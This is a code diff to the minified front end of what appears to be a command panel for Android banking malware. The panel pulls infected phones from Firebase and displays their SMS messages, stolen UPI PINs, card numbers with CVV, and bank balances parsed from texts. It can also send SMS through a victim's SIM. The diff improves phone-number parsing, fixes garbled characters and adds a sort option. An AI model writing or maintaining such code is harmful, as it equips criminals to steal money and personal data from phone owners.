@@ -13277,7 +13277,7 @@ async function yn(A, tt, b, d) {
         const h = await p.text().catch(() => "");
         let o;
         if (p.status === 401 || p.status === 403) {
-            o = "PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key from Firebase Console â†’ Project Settings â†’ Service Accounts â†’ Database Secrets.";
+            o = "PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key from Firebase Console -> Project Settings -> Service Accounts -> Database Secrets.";
         } else if (p.status === 404) {
             return null;
         } else {
@@ -13387,7 +13387,7 @@ function Wp(A) {
     }
 }
 const sa = "(?:Number|à¤¨à¤‚à¤¬à¤°|Nambhar|à¤¨à¤®à¥à¤¬à¤°|No\\.?|Num)",
-    $p = [new RegExp(`(?:Jio|JIO)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Airtel|AIRTEL)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:BSNL|bsnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:MTNL|mtnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Docomo|DOCOMO|Tata)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Reliance|RELIANCE)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Telenor|TELENOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Uninor|UNINOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Videocon|VIDEOCON)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), /(?:à¤¨à¤‚à¤¬à¤°|à¤¨à¤®à¥à¤¬à¤°)\s*[:\-]\s*([6-9][0-9]{9})/, /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|à¤¨à¤‚à¤¬à¤°)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i, /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|à¤¨à¤‚à¤¬à¤°)\s*[:\-]\s*([6-9][0-9]{9})/i, /Number\s*[:\-]\s*([6-9][0-9]{9})/i, /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i, /(\+91[-\s]?[6-9][0-9]{9})/, /(?:\b91)([6-9][0-9]{9})\b/, /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/];
+    $p = [new RegExp(`(?:Jio|JIO)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Airtel|AIRTEL)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:BSNL|bsnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:MTNL|mtnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Docomo|DOCOMO|Tata)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Reliance|RELIANCE)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Telenor|TELENOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Uninor|UNINOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Videocon|VIDEOCON)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`)];
 
 function yh(A) {
     for (const tt of $p) {
@@ -13544,6 +13544,31 @@ function lh(A) {
     })
 }
 
+
+function cmValidPhone(raw) {
+    if (raw == null) return "";
+    const s = String(raw).trim();
+    if (!s || /^(null|undefined|unknown|none|n\/a|-|—|-|0)$/i.test(s)) return "";
+    const digits = s.replace(/[^0-9]/g, "");
+    if (digits.length === 10 && /^[6-9]/.test(digits)) return digits;
+    if (digits.length === 12 && /^91[6-9]/.test(digits)) return digits.slice(2);
+    if (digits.length === 11 && /^0[6-9]/.test(digits)) return digits.slice(1);
+    return "";
+}
+function cmSimNumber(client, sims) {
+    const fromMob = cmValidPhone(client.mobNo || client.phoneNumber || client.phone || client.number || client.mobile);
+    if (fromMob) return fromMob;
+    for (const sim of sims) {
+        if (!sim || typeof sim !== "object") continue;
+        const n = cmValidPhone(sim.phoneNumber || sim.number || sim.mobNo || sim.phone || sim.msisdn);
+        if (n) return n;
+    }
+    return "-";
+}
+function cmCmpDeviceId(a, b) {
+    return String(a).localeCompare(String(b), undefined, { numeric: true, sensitivity: "base" });
+}
+
 function n1(A) {
     const tt = [];
     return A && typeof A == "object" && Object.entries(A).forEach(([b, d]) => {
@@ -13552,26 +13577,27 @@ function n1(A) {
             f = S.sims;
         let p = [];
         Array.isArray(f) ? p = f : f && typeof f == "object" && (p = Object.values(f));
-        const h = S.battery ?? "â€”",
+        const h = S.battery ?? "-",
             o = String(h),
             x = parseInt(o.replace("%", "")) || 0,
             T = S.lastSeen ?? S.last_seen ?? S.lastOnline ?? S.last_online ?? S.lastActive ?? S.last_active ?? S.timestamp ?? S.time ?? S.dateTime ?? S.updatedAt ?? S.updated_at ?? null,
             w = a1(T);
         tt.push({
             id: b,
+            fbIndex: tt.length,
             name: String(S.modelName || S.model || S.deviceName || b),
             battery: o,
             batteryPercent: x,
             status: !!S.status,
-            phoneNumber: String(S.mobNo || (p[0] ?.phoneNumber ?? "â€”")),
-            android: String(S.androidV || S.androidVersion || "â€”"),
-            ip: String(S.ip_address || "â€”"),
-            storage: String(S.storage || "â€”"),
-            provider: String(S.service_provider || "â€”"),
+            phoneNumber: cmSimNumber(S, p),
+            android: String(S.androidV || S.androidVersion || "-"),
+            ip: String(S.ip_address || "-"),
+            storage: String(S.storage || "-"),
+            provider: String(S.service_provider || "-"),
             sims: p,
             upipin: S.upipin ? String(S.upipin) : null,
-            cpu: String(S.cpu_arch || "â€”"),
-            sdk: String(S.sdkV || "â€”"),
+            cpu: String(S.cpu_arch || "-"),
+            sdk: String(S.sdkV || "-"),
             lastSeen: w,
             lastSeenFormatted: w ? vs(w) : void 0
         })
@@ -13990,7 +14016,7 @@ Error: ${_t}`)
                                     children: _.url
                                 }), r.jsxs("p", {
                                     className: "text-xs text-muted-foreground mt-0.5 font-mono",
-                                    children: [_.date, " Â· ", _.key.substring(0, 20), "â€¦"]
+                                    children: [_.date, "  ·  ", _.key.substring(0, 20), "..."]
                                 })]
                             }), r.jsxs("div", {
                                 className: "flex items-center gap-2",
@@ -14078,7 +14104,7 @@ Error: ${_t}`)
                                 className: "text-center",
                                 children: [r.jsx("p", {
                                     className: "text-sm font-semibold text-orange-400",
-                                    children: "Scanning APKâ€¦"
+                                    children: "Scanning APK..."
                                 }), r.jsx("p", {
                                     className: "text-[11px] text-[#444] mt-0.5 font-mono truncate max-w-[220px]",
                                     children: V
@@ -14196,7 +14222,7 @@ Error: ${_t}`)
                                 className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                             }) : r.jsx(hh, {
                                 className: "w-4 h-4"
-                            }), w ? "Connectingâ€¦" : "Save & Connect"]
+                            }), w ? "Connecting..." : "Save & Connect"]
                         }), r.jsx("button", {
                             onClick: () => {
                                 S(!1), T(""), y(), p(""), o("")
@@ -14327,7 +14353,7 @@ function u1({
         className: "flex items-center gap-2",
         children: [r.jsx("span", {
             className: "font-mono text-xs text-[#aaa]",
-            children: b ? `â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ${A}` : `â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ${A}`
+            children: b ? `•••• •••• •••• ${A}` : `•••• •••• •••• ${A}`
         }), tt && r.jsx("span", {
             className: "text-[10px] text-purple-400 font-semibold",
             children: tt
@@ -14360,7 +14386,7 @@ function c1({
                     })]
                 }), A.accountLast4 && r.jsxs("span", {
                     className: "text-[10px] font-mono text-[#555] bg-[#111] px-1.5 py-0.5 rounded",
-                    children: ["â€¢â€¢", A.accountLast4]
+                    children: ["••", A.accountLast4]
                 })]
             }), A.transactionType && r.jsxs("span", {
                 className: `flex items-center gap-0.5 text-[10px] font-semibold px-2 py-0.5 rounded-full ${tt?"bg-emerald-500/10 text-emerald-400 border border-emerald-500/20":"bg-red-500/10 text-red-400 border border-red-500/20"}`,
@@ -14455,7 +14481,7 @@ function o1({
                 children: "CVV:"
             }), r.jsx("span", {
                 className: "text-xs font-mono text-purple-300",
-                children: tt ? A.cvv : "â€¢â€¢â€¢"
+                children: tt ? A.cvv : "•••"
             }), r.jsx("button", {
                 onClick: () => b(!tt),
                 className: "p-0.5 text-[#444] hover:text-purple-400 transition-colors",
@@ -14481,8 +14507,8 @@ function f1({
         S = d && d.bankBalances.length > 0,
         f = d && d.cards.length > 0,
         p = S ? d.bankBalances[0] : null,
-        h = A.phoneNumber && A.phoneNumber !== "â€”" ? A.phoneNumber : d ?.phoneNumbers[0] || "â€”",
-        o = A.provider && A.provider !== "â€”" ? A.provider : d ?.networks[0] || null;
+        h = cmValidPhone(A.phoneNumber) || "-",
+        o = A.provider && A.provider !== "-" && A.provider !== "—" && A.provider !== "-" ? A.provider : null;
     return r.jsxs("div", {
         onClick: tt,
         className: "group relative bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:border-[#2a2a2a] hover:bg-[#161616] hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0",
@@ -14528,7 +14554,7 @@ function f1({
                     children: "Android"
                 }), r.jsx("p", {
                     className: "text-sm font-bold text-[#ccc]",
-                    children: A.android !== "â€”" ? `v${A.android.replace("v","")}` : "â€”"
+                    children: A.android !== "-" && A.android !== "—" && A.android !== "-" ? `v${A.android.replace("v","")}` : "-"
                 })]
             }), r.jsxs("div", {
                 children: [r.jsx("p", {
@@ -14570,7 +14596,7 @@ function f1({
                         children: p.bankName
                     }), p.accountLast4 && r.jsxs("span", {
                         className: "text-[9px] font-mono text-[#444]",
-                        children: ["â€¢â€¢", p.accountLast4]
+                        children: ["••", p.accountLast4]
                     })]
                 }), r.jsxs("span", {
                     className: "text-sm font-black text-white",
@@ -14593,7 +14619,7 @@ function f1({
                 className: "w-3.5 h-3.5 text-purple-400"
             }), r.jsxs("span", {
                 className: "text-[10px] font-semibold text-purple-400",
-                children: ["Card â€¢â€¢", d.cards[0].cardLast4]
+                children: ["Card ••", d.cards[0].cardLast4]
             }), d.cards[0].cardType && r.jsx("span", {
                 className: "text-[10px] text-[#555]",
                 children: d.cards[0].cardType
@@ -14641,7 +14667,7 @@ function ta({
             children: A
         }), r.jsx("span", {
             className: `text-xs text-right break-all ${b?"font-mono":"font-semibold"} ${d||"text-[#ccc]"}`,
-            children: tt || "â€”"
+            children: tt || "-"
         })]
     })
 }
@@ -14665,7 +14691,7 @@ function d1({
                 I = Gu(c);
             h(I), x(Xu(I))
         } catch (c) {
-            (c instanceof Error ? c.message : String(c)).includes("PERMISSION_DENIED") && f("Firebase permission denied â€” check your Database Secret key"), h([])
+            (c instanceof Error ? c.message : String(c)).includes("PERMISSION_DENIED") && f("Firebase permission denied - check your Database Secret key"), h([])
         } finally {
             w(!1)
         }
@@ -14700,7 +14726,7 @@ function d1({
                 }), f("SMS queued!"), g("")
             } catch (c) {
                 const I = c instanceof Error ? c.message : String(c);
-                f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied â€” cannot send" : "Send failed")
+                f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied - cannot send" : "Send failed")
             } finally {
                 M(!1)
             }
@@ -14714,8 +14740,8 @@ function d1({
             }
         },
         ht = A.batteryPercent >= 60 ? "#86efac" : A.batteryPercent >= 30 ? "#fde68a" : "#ef4444",
-        xt = A.phoneNumber && A.phoneNumber !== "â€”" ? A.phoneNumber : o.phoneNumbers[0] || "â€”",
-        D = A.provider && A.provider !== "â€”" ? A.provider : o.networks[0] || "â€”",
+        xt = cmValidPhone(A.phoneNumber) || "-",
+        D = A.provider && A.provider !== "-" && A.provider !== "—" && A.provider !== "-" ? A.provider : "-",
         at = [{
             key: "info",
             label: "Info"
@@ -14738,7 +14764,7 @@ function d1({
         children: [r.jsx("div", {
             className: "absolute inset-0 bg-black/70 backdrop-blur-sm"
         }), r.jsxs("div", {
-            className: "relative ml-auto w-full max-w-md h-full flex flex-col bg-[#0d0d0d] border-l border-[#1f1f1f] shadow-2xl",
+            className: "relative ml-auto w-full max-w-md h-full flex flex-col bg-[#0d0d0d] border-l border-[#1f1f1f] shadow-2xl cm-device-drawer",
             onClick: c => c.stopPropagation(),
             children: [r.jsxs("div", {
                 className: "flex items-center justify-between px-5 py-4 border-b border-[#1a1a1a]",
@@ -14874,25 +14900,14 @@ function d1({
                     }), r.jsx(ta, {
                         label: "SIM Cards",
                         value: `${A.sims.length} SIM(s)`
-                    }), A.sims.map((c, I) => c.phoneNumber && r.jsx(ta, {
-                        label: `SIM ${I+1} Number`,
-                        value: c.phoneNumber,
-                        mono: !0
-                    }, I)), o.phoneNumbers.length > 0 && r.jsxs(r.Fragment, {
-                        children: [r.jsx("p", {
-                            className: "text-[10px] uppercase tracking-widest text-[#444] mt-4 mb-3 font-semibold",
-                            children: "From SMS"
-                        }), o.phoneNumbers.map((c, I) => r.jsx(ta, {
-                            label: `Phone #${I+1}`,
-                            value: c,
-                            mono: !0,
-                            highlight: "text-blue-400"
-                        }, I))]
-                    }), o.networks.length > 0 && o.networks.map((c, I) => r.jsx(ta, {
-                        label: `Network #${I+1}`,
-                        value: c,
-                        highlight: "text-purple-400"
-                    }, I))]
+                    }), A.sims.map((c, I) => {
+                        const num = cmValidPhone(c && (c.phoneNumber || c.number || c.mobNo));
+                        return num ? r.jsx(ta, {
+                            label: "SIM " + (I + 1) + " Number",
+                            value: num,
+                            mono: !0
+                        }, I) : null;
+                    })]
                 }), H === "bank" && r.jsxs("div", {
                     className: "flex flex-col h-full",
                     children: [r.jsxs("div", {
@@ -14938,7 +14953,7 @@ function d1({
                                 className: "p-3 rounded-xl bg-[#081410] border border-emerald-900/40 mb-1",
                                 children: [r.jsxs("p", {
                                     className: "text-[10px] uppercase tracking-widest text-emerald-700 mb-1",
-                                    children: ["Latest Balance Â· ", o.bankBalances[0].bankName]
+                                    children: ["Latest Balance  ·  ", o.bankBalances[0].bankName]
                                 }), r.jsxs("div", {
                                     className: "flex items-end gap-2",
                                     children: [r.jsxs("span", {
@@ -14946,7 +14961,7 @@ function d1({
                                         children: ["â‚¹", Pl(o.bankBalances[0].availableBalance)]
                                     }), o.bankBalances[0].accountLast4 && r.jsxs("span", {
                                         className: "text-xs text-emerald-700 mb-0.5 font-mono",
-                                        children: ["â€¢â€¢", o.bankBalances[0].accountLast4]
+                                        children: ["••", o.bankBalances[0].accountLast4]
                                     })]
                                 })]
                             }), o.bankBalances.map((c, I) => r.jsx(c1, {
@@ -14988,7 +15003,7 @@ function d1({
                         className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                         children: [r.jsx("span", {
                             className: "text-xs text-[#555]",
-                            children: "Last 60 messages Â· auto-refreshes"
+                            children: "Last 60 messages  ·  auto-refreshes"
                         }), r.jsx("button", {
                             onClick: V,
                             className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
@@ -15004,7 +15019,7 @@ function d1({
                                 className: "w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3"
                             }), r.jsx("p", {
                                 className: "text-xs text-[#555]",
-                                children: "Loading messagesâ€¦"
+                                children: "Loading messages..."
                             })]
                         }) : p.length === 0 ? r.jsxs("div", {
                             className: "py-12 text-center",
@@ -15078,7 +15093,7 @@ function d1({
                             value: E,
                             onChange: c => g(c.target.value),
                             rows: 4,
-                            placeholder: "Type your message hereâ€¦",
+                            placeholder: "Type your message here...",
                             className: "w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all"
                         }), r.jsxs("p", {
                             className: "text-[10px] text-[#444] mt-1 text-right",
@@ -15092,8 +15107,8 @@ function d1({
                             className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                         }) : r.jsx(Sp, {
                             className: "w-4 h-4"
-                        }), k ? "Sendingâ€¦" : `Send via SIM ${z}`]
-                    }), xt && xt !== "â€”" && r.jsxs("button", {
+                        }), k ? "Sending..." : `Send via SIM ${z}`]
+                    }), xt && xt !== "-" && r.jsxs("button", {
                         onClick: () => v(xt),
                         className: "w-full py-2.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-[#888] hover:border-[#333] transition-all",
                         children: ["Use device number: ", r.jsx("span", {
@@ -15161,7 +15176,7 @@ function p1({
     fbKey: tt,
     onLogout: b
 }) {
-    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("all"), [v, E] = jt.useState("new"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), xt = jt.useCallback(U => {
+    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("all"), [v, E] = jt.useState("firebase"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 3500)
     }, []), D = jt.useCallback(async (U, J) => {
         try {
@@ -15201,11 +15216,11 @@ function p1({
                 }
                 U || o(!1)
             }
-            V.current > 0 && ut.length > V.current && xt("ðŸ”” New device connected!"), V.current = ut.length
+            V.current > 0 && ut.length > V.current && xt("New device connected!"), V.current = ut.length
         } catch (J) {
             p(!1);
             const ut = J instanceof Error ? J.message : String(J);
-            ut.includes("PERMISSION_DENIED") || ut.includes("401") || ut.includes("403") ? H("Firebase Permission Denied â€” Your API key is rejected. Go to Firebase Console â†’ Project Settings â†’ Service Accounts â†’ Database Secrets and copy the secret key. That secret (not the API key starting with AIza...) is what works here. Also ensure Firebase Realtime Database Rules allow read.") : ut.includes("NOT_FOUND") || ut.includes("404") ? H("Database path not found. Check your Firebase URL is correct.") : H(`Connection error: ${ut.slice(0,120)}`)
+            ut.includes("PERMISSION_DENIED") || ut.includes("401") || ut.includes("403") ? H("Firebase Permission Denied - Your API key is rejected. Go to Firebase Console -> Project Settings -> Service Accounts -> Database Secrets and copy the secret key. That secret (not the API key starting with AIza...) is what works here. Also ensure Firebase Realtime Database Rules allow read.") : ut.includes("NOT_FOUND") || ut.includes("404") ? H("Database path not found. Check your Firebase URL is correct.") : H(`Connection error: ${ut.slice(0,120)}`)
         }
     }, [A, tt, D, xt]), c = jt.useCallback(async () => {
         const U = d;
@@ -15232,7 +15247,7 @@ function p1({
             if (w === "online" && !U.status || w === "offline" && U.status || w === "upi" && !U.upipin || w === "bank" && !U.smsAnalysis ?.bankBalances.length || w === "card" && !U.smsAnalysis ?.cards.length) return !1;
             const J = g.toLowerCase();
             return !(J && !U.name.toLowerCase().includes(J) && !U.phoneNumber.includes(J) && !U.id.includes(J))
-        }).sort((U, J) => v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? U.id.localeCompare(J.id) : J.id.localeCompare(U.id)),
+        }).sort((U, J) => v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? cmCmpDeviceId(J.id, U.id) : v === "new" ? cmCmpDeviceId(J.id, U.id) : cmCmpDeviceId(U.id, J.id)),
         it = d.filter(U => U.status).length,
         bt = d.length - it,
         y = d.filter(U => U.smsAnalysis ?.bankBalances.length).length,
@@ -15247,7 +15262,7 @@ function p1({
         children: [r.jsx("header", {
             className: "sticky top-0 z-40 bg-[#0a0a0a]/95 backdrop-blur-md border-b border-[#1a1a1a]",
             children: r.jsxs("div", {
-                className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4",
+                className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4 cm-panel-header",
                 children: [r.jsxs("div", {
                     className: "flex items-center gap-2.5 flex-shrink-0",
                     children: [r.jsx("img", {
@@ -15414,6 +15429,9 @@ function p1({
                             onChange: U => E(U.target.value),
                             className: "bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5 outline-none",
                             children: [r.jsx("option", {
+                                value: "firebase",
+                                children: "Firebase order"
+                            }), r.jsx("option", {
                                 value: "new",
                                 children: "Newest"
                             }), r.jsx("option", {
@@ -15437,7 +15455,7 @@ function p1({
                 })]
             })
         }), r.jsx("main", {
-            className: "flex-1 max-w-screen-2xl mx-auto w-full px-6 py-6",
+            className: "flex-1 max-w-screen-2xl mx-auto w-full px-6 py-6 cm-panel-main",
             children: f ? r.jsxs("div", {
                 children: [r.jsxs("div", {
                     className: "flex items-center gap-3 mb-5",
@@ -15445,7 +15463,7 @@ function p1({
                         className: "w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin"
                     }), r.jsx("span", {
                         className: "text-sm text-[#555]",
-                        children: "Connecting to Firebaseâ€¦"
+                        children: "Connecting to Firebase..."
                     })]
                 }), r.jsx("div", {
                     className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
@@ -15465,7 +15483,7 @@ function p1({
                     children: "No devices connected"
                 }), r.jsx("p", {
                     className: "text-sm text-[#333] mt-1.5 mb-5",
-                    children: "Waiting for devices to registerâ€¦"
+                    children: "Waiting for devices to register..."
                 }), r.jsxs("div", {
                     className: "flex items-center gap-2 px-4 py-2 rounded-full bg-[#111] border border-[#1e1e1e]",
                     children: [r.jsx("div", {
@@ -15482,7 +15500,7 @@ function p1({
                         className: "w-3 h-3 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin"
                     }), r.jsx("span", {
                         className: "text-xs text-[#555]",
-                        children: "Loading SMS dataâ€¦"
+                        children: "Loading SMS data..."
                     })]
                 }), r.jsxs("div", {
                     className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
